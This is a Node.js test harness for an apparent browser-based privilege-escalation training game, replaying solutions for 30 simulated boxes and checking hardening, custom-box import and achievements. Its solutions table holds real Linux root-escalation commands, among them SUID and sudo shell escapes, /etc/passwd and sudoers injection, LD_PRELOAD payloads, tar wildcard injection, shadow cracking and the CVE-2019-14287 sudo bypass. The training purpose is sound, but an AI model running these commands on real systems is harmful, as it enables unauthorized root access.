// Logic harness: loads the real game modules in a vm sandbox and plays the
// canonical solution of each box, asserting root is obtained (plus a negative
// test that a bogus exploit does NOT grant root). Fast, browserless.
//   node tests/harness.js            # runs against the repo it lives in
//   RQLANG=fr node tests/harness.js  # same, with the FR dictionary active
const vm = require('vm');
const fs = require('fs');
const path = require('path');

const REPO = process.argv[2] || path.resolve(__dirname, '..');
const JS = (f) => fs.readFileSync(path.join(REPO, 'js', f), 'utf8');

// ── Minimal DOM / window sandbox ────────────────────────────────────────────
const sandbox = {};
sandbox.window = sandbox;
sandbox.globalThis = sandbox;
sandbox.console = console;
sandbox.setTimeout = () => {};        // swallow the win() timer
sandbox.document = {
    getElementById: () => ({ innerHTML: '', appendChild() {}, style: {}, addEventListener() {}, focus() {} }),
    querySelectorAll: () => [],
    body: { classList: { add() {}, remove() {} } },
};
vm.createContext(sandbox);

for (const f of ['i18n.js', 'fs.js', 'levels.js', 'commands.js']) {
    vm.runInContext(JS(f), sandbox, { filename: f });
}

// ── Game shims the engine expects on window ─────────────────────────────────
let CURRENT = null;
sandbox.currentLang = process.env.RQLANG || 'en';
sandbox.updatePrompt = () => {};
sandbox.setLanguage = (l) => { sandbox.currentLang = l; };
sandbox.GAME = {
    level: () => CURRENT,
    win: () => {},
    giveHint: () => [],
    nextLevel: () => [],
    reset: () => {},
    markHardened: () => {},
};

function loadLevel(level) {
    CURRENT = level;
    sandbox.FS.load(level);
    Object.assign(sandbox.SESSION, {
        user: level.user || 'player',
        host: level.host,
        cwd: level.cwd || '/home/player',
        env: { PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' },
        isRoot: false, hintIndex: 0, tmpBins: {}, pendingCron: false,
        cronPayload: null, cmdCount: 0, startTime: Date.now(),
        blueTeam: false, sudoAuthed: false, nfsMount: null,
    });
    sandbox.TERM = sandbox.TERM || { history: [] };
    sandbox.TERM.history = [];
}
function play(cmds) { for (const c of cmds) { sandbox.TERM.history.push(c); sandbox.CMD.execute(c); } }

// ── Canonical solutions (mirrors tests/rootquest.spec.js) ───────────────────
const SOLUTIONS = {
    1: ['find . -exec /bin/sh -p \\;'],
    2: ['echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/backup.sh', 'wait'],
    3: ["python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"],
    4: ["echo '#!/bin/sh' > /tmp/ps", "echo '/bin/sh' >> /tmp/ps", 'chmod +x /tmp/ps', 'export PATH=/tmp:$PATH', '/usr/local/bin/status'],
    5: ["sudo vim -c ':!/bin/sh'"],
    6: ["echo 'r00t::0:0:pwned:/root:/bin/bash' >> /etc/passwd", 'su r00t'],
    7: ["sudo awk 'BEGIN{system(\"/bin/sh\")}'"],
    8: ['./pwnkit'],
    9: ['su svc', 'sudo bash'],
    10: ['docker run -v /:/mnt -it alpine chroot /mnt sh'],
    11: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/x.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c', 'sudo LD_PRELOAD=/tmp/x.so apache2ctl'],
    12: ['cd /home/player/share', "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh", 'touch ./--checkpoint=1', "touch './--checkpoint-action=exec=sh runme.sh'", 'wait'],
    13: ['ssh -i /opt/backup/id_rsa root@localhost'],
    14: ["echo 'player ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn", 'sudo bash'],
    15: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/x.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c', 'echo /tmp/x.so > /etc/ld.so.preload', '/usr/bin/passwd'],
    16: ['sudo find . -exec /bin/sh \\;'],
    17: ['sudo env /bin/sh'],
    18: ["sudo python3 -c 'import os; os.system(\"/bin/sh\")'"],
    19: ['sudo less !/bin/sh'],
    20: ["echo 'r00t::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd", 'su r00t'],
    21: ["python3 -c \"print(open('/etc/shadow').read())\"", 'john /tmp/shadow.copy', 'su root'],
    22: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/libagent.so.1.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/libagent.so.1 /tmp/libagent.so.1.c', 'sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent'],
    23: ['showmount -e', 'mount -t nfs box-23:/srv/backups /mnt', 'touch /srv/backups/rootbash', 'chmod u+s /srv/backups/rootbash', '/srv/backups/rootbash'],
    24: ["sudo perl -e 'exec \"/bin/sh\";'"],
    25: ['sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\''],
    26: [
        "echo '#!/bin/sh' > /tmp/pwn.sh",
        'echo \'exec /bin/sh\' >> /tmp/pwn.sh',
        'chmod +x /tmp/pwn.sh',
        'sudo EDITOR=/tmp/pwn.sh -e /etc/motd'
    ],
    27: [
        "python3 -c \"open('/etc/passwd','a').write('pwnd::0:0::/root:/bin/bash\\n')\"",
        'su pwnd'
    ],
    28: ['sudo -u#-1 /bin/bash'],
    29: ['sudo systemd-run /bin/sh'],
    30: ['sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh'],
};

let pass = 0, fail = 0;
const LEVELS = sandbox.LEVELS;
console.log(`Loaded ${LEVELS.length} levels from ${REPO} (lang=${sandbox.currentLang})\n`);
for (const level of LEVELS) {
    const sol = SOLUTIONS[level.id];
    if (!sol) { console.log(`?? box-${String(level.id).padStart(2, '0')}: NO SOLUTION DEFINED`); fail++; continue; }
    loadLevel(level);
    play(sol);
    const ok = sandbox.SESSION.isRoot === true;
    console.log(`${ok ? 'PASS' : 'FAIL'}  box-${String(level.id).padStart(2, '0')}  ${level.title.en}`);
    ok ? pass++ : fail++;
}

// Negative test: a bogus exploit must NOT grant root on box-01
loadLevel(LEVELS[0]);
play(['echo hello', 'ls -la', 'cat /etc/passwd']);
const neg = sandbox.SESSION.isRoot === false;
console.log(`${neg ? 'PASS' : 'FAIL'}  negative (no accidental root on box-01)`);
neg ? pass++ : fail++;

// sudo -l: first call this machine shows a simulated password prompt line,
// a second call does not (mirrors sudo's cached credential ticket).
loadLevel(LEVELS[4]); // box-05, has a sudoers entry
const first = sandbox.CMD.execute('sudo -l');
const second = sandbox.CMD.execute('sudo -l');
const authOk = first.some(l => l.text.startsWith('[sudo] password for'))
    && !second.some(l => l.text.startsWith('[sudo] password for'));
console.log(`${authOk ? 'PASS' : 'FAIL'}  sudo -l password prompt (once per machine)`);
authOk ? pass++ : fail++;

// box-28: (ALL, !root) exclusion must block the literal name and uid 0, but
// still fall for the CVE-2019-14287 negative-uid / uint32-wraparound bypass.
loadLevel(LEVELS[27]); // box-28
const blockedName = sandbox.CMD.execute('sudo -u root /bin/bash');
const blockedZero = sandbox.CMD.execute('sudo -u#0 /bin/bash');
const nameOk = blockedName.some(l => /not allowed to execute/.test(l.text)) && sandbox.SESSION.isRoot === false;
const zeroOk = blockedZero.some(l => /not allowed to execute/.test(l.text)) && sandbox.SESSION.isRoot === false;
sandbox.CMD.execute('sudo -u#-1 /bin/bash');
const bypassOk = sandbox.SESSION.isRoot === true;
const negUidOk = nameOk && zeroOk && bypassOk;
console.log(`${negUidOk ? 'PASS' : 'FAIL'}  sudo negative-uid bypass (box-28: -u root and -u#0 blocked, -u#-1 roots)`);
negUidOk ? pass++ : fail++;

// Blue-team: for boxes that declare a fix, root then harden and confirm it closes.
console.log('');
for (const level of LEVELS) {
    if (!level.harden) continue;
    loadLevel(level);
    play(SOLUTIONS[level.id]);       // reach root
    sandbox.SESSION.blueTeam = true; // enter harden phase
    play([level.harden.hint.en]);    // apply the documented fix
    const ok = sandbox.CMD.checkHardened(level) === true && sandbox.SESSION.blueTeam === false;
    console.log(`${ok ? 'PASS' : 'FAIL'}  harden box-${String(level.id).padStart(2, '0')}  (${level.harden.type})`);
    ok ? pass++ : fail++;
}

// ── GAME_CUSTOM (box import/export) ─────────────────────────────────────────
// Isolated sandbox: main.js defines its own window.GAME, which would clash
// with the hand-rolled shim used above.
{
    const sandbox2 = {};
    sandbox2.window = sandbox2;
    sandbox2.globalThis = sandbox2;
    sandbox2.console = { log() {}, warn() {}, error() {} };
    sandbox2.setTimeout = () => {};
    const store = {};
    sandbox2.localStorage = {
        getItem: (k) => (k in store ? store[k] : null),
        setItem: (k, v) => { store[k] = String(v); },
    };
    sandbox2.document = {
        addEventListener: () => {},
        getElementById: () => null,
        querySelectorAll: () => [],
        body: { classList: { add() {}, remove() {} } },
    };
    vm.createContext(sandbox2);
    vm.runInContext(JS('levels.js'), sandbox2, { filename: 'levels.js' });
    vm.runInContext(JS('main.js'), sandbox2, { filename: 'main.js' });

    const GC = sandbox2.GAME_CUSTOM;
    const startLen = sandbox2.LEVELS.length;

    const bad = GC.import(JSON.stringify({ codename: 'x' }));
    const t1 = bad.ok === false && bad.errors.length > 0;

    const validBox = {
        codename: 'custom-01',
        title: 'Custom · Test Box',
        user: 'player', host: 'custom-01', cwd: '/home/player',
        fs: { '/': { type: 'dir', owner: 'root', mode: '755', children: [] } },
        wins: [{ type: 'custom_win' }],
        flag: 'flag{custom_test}',
    };
    const good = GC.import(JSON.stringify(validBox));
    const t2 = good.ok === true
        && sandbox2.LEVELS.length === startLen + 1
        && sandbox2.MACHINE_META.length === sandbox2.LEVELS.length
        && sandbox2.LEVELS[sandbox2.LEVELS.length - 1].custom === true;
    const t3 = good.ok && good.level.title.en === 'Custom · Test Box' && good.level.title.fr === 'Custom · Test Box';

    const exported = GC.exportJSON(sandbox2.LEVELS.length - 1);
    const reparsed = exported && JSON.parse(exported);
    const t4 = !!reparsed && reparsed.codename === 'custom-01' && reparsed.id === undefined && reparsed.custom === undefined;

    const persisted = JSON.parse(store[GC.STORE_KEY] || '[]');
    const t5 = persisted.length === 1 && persisted[0].codename === 'custom-01';

    // Share link: export the just-imported box as a URL, then re-import it
    // from the hash (as a fresh visitor opening that link would) and check
    // the round-tripped box matches. No `location` global in this sandbox —
    // exportURL degrades to a bare "#box=..." fragment, which is exactly
    // what importFromHash consumes.
    const shareUrl = GC.exportURL(sandbox2.LEVELS.length - 1);
    const t6 = typeof shareUrl === 'string' && shareUrl.startsWith('#box=');
    const shareImport = GC.importFromHash(shareUrl);
    const t7 = !!shareImport && shareImport.ok === true
        && shareImport.level.codename === 'custom-01'
        && shareImport.level.flag === 'flag{custom_test}'
        && sandbox2.LEVELS.length === startLen + 2;
    const noHash = GC.importFromHash('') === null && GC.importFromHash('#somethingelse=1') === null;
    const badHash = GC.importFromHash('#box=%%%not-valid-at-all');
    const t8 = noHash && badHash && badHash.ok === false;

    const ok = t1 && t2 && t3 && t4 && t5 && t6 && t7 && t8;
    console.log(`${ok ? 'PASS' : 'FAIL'}  custom box import (validation + append + export + persistence)`);
    ok ? pass++ : fail++;
    console.log(`${(t6 && t7 && t8) ? 'PASS' : 'FAIL'}  custom box share link (export URL + re-import from hash)`);
    (t6 && t7 && t8) ? pass++ : fail++;
}

// ── Achievements ─────────────────────────────────────────────────────────
// Separate sandbox, untouched by the custom-box tests above, so LEVELS.length
// is exactly the base machine count and the "halfway" math below is exact.
{
    const sandbox3 = {};
    sandbox3.window = sandbox3;
    sandbox3.globalThis = sandbox3;
    sandbox3.console = { log() {}, warn() {}, error() {} };
    sandbox3.setTimeout = () => {};
    sandbox3.localStorage = { getItem: () => null, setItem: () => {} };
    sandbox3.document = {
        addEventListener: () => {},
        getElementById: () => null,
        querySelectorAll: () => [],
        body: { classList: { add() {}, remove() {} } },
    };
    vm.createContext(sandbox3);
    vm.runInContext(JS('levels.js'), sandbox3, { filename: 'levels.js' });
    vm.runInContext(JS('main.js'), sandbox3, { filename: 'main.js' });
    vm.runInContext(JS('walkthrough.js'), sandbox3, { filename: 'walkthrough.js' });

    const G = sandbox3.GAME;
    const total = sandbox3.LEVELS.length;
    const halfwayThreshold = Math.ceil(total / 2);

    // "Halfway There" must track the *current* machine count, not a number
    // baked in when the roster was smaller — own one short of half must not
    // qualify, owning exactly half (rounded up) must.
    G.completed = Array.from({ length: halfwayThreshold - 1 }, (_, i) => i + 1);
    const notYetHalfway = G.achState().owned < halfwayThreshold && !G.updateAchievements(false).includes('halfway');
    G.completed.push(halfwayThreshold); // one more machine tips it over
    const nowHalfway = G.updateAchievements(false).includes('halfway');
    const t1 = notYetHalfway && nowHalfway;

    // First Blood fires at 1, Root Wizard only at "own literally everything".
    G.completed = [1];
    const firstBlood = G.updateAchievements(false).includes('first_blood') && !G.updateAchievements(false).includes('root_wizard');
    G.completed = Array.from({ length: total }, (_, i) => i + 1);
    const rootWizard = G.updateAchievements(false).includes('root_wizard');
    const t2 = firstBlood && rootWizard;

    const ok = t1 && t2;
    console.log(`${ok ? 'PASS' : 'FAIL'}  achievements (dynamic halfway threshold tracks current machine count)`);
    ok ? pass++ : fail++;

    // Explanation-mode coverage: every built-in box must have a non-empty
    // WALKTHROUGHS entry, or the "explain" feature silently degrades to its
    // "not available" fallback for whichever box(es) got missed when new
    // content was added — as happened for box-24..27 before this test existed.
    const missing = sandbox3.LEVELS
        .filter(l => !l.custom)
        .map(l => l.id)
        .filter(id => !Array.isArray(sandbox3.WALKTHROUGHS[id]) || sandbox3.WALKTHROUGHS[id].length === 0);
    const wtOk = missing.length === 0;
    console.log(`${wtOk ? 'PASS' : 'FAIL'}  walkthrough coverage (every built-in box has an explain-mode entry)${wtOk ? '' : ' — missing: ' + missing.join(', ')}`);
    wtOk ? pass++ : fail++;
}

// ── Service-worker cache version vs package.json ────────────────────────────
// Cache-first PWA: a returning visitor keeps whatever JS/CSS was cached under
// CACHE_VERSION forever, until that string itself changes — the fetch handler
// never revalidates against the network. Every past release was supposed to
// bump it alongside package.json but didn't always (v6 vs 17 package bumps by
// the time this test was written) — assert they match so "ship a code change,
// forget the cache key" fails loudly instead of quietly stranding installed
// users on old code.
{
    const pkgVersion = JSON.parse(fs.readFileSync(path.join(REPO, 'package.json'), 'utf8')).version;
    const swSrc = fs.readFileSync(path.join(REPO, 'service-worker.js'), 'utf8');
    const m = swSrc.match(/CACHE_VERSION\s*=\s*'rootquest-v([^']+)'/);
    const swVersion = m && m[1];
    const ok = swVersion === pkgVersion;
    console.log(`${ok ? 'PASS' : 'FAIL'}  service-worker CACHE_VERSION matches package.json (${swVersion} vs ${pkgVersion})`);
    ok ? pass++ : fail++;
}

console.log(`\n${pass}/${pass + fail} PASS`);
process.exit(fail === 0 ? 0 : 1);
